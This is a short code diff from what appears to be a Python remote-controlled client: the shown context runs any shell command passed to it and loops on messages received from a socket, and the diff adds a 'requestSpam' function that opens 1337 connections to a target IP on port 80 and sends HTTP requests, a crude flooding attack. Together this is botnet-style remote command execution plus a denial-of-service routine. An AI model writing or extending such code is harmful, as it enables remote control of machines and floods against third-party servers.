@@ -16,6 +16,13 @@ class commands:
     def shell( command ): # Runs a shell command.
         os.system( command )
 
+    def requestSpam( IP ):
+        for _ in range(1337):
+            attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            attacker . connect((IP, 80))
+            attacker . send("GET /index.html HTTP/1.1\r\n")
+            attacker . close()
+
 turnedOn = True
 while turnedOn:
     message = clientSocket.recv(2048)
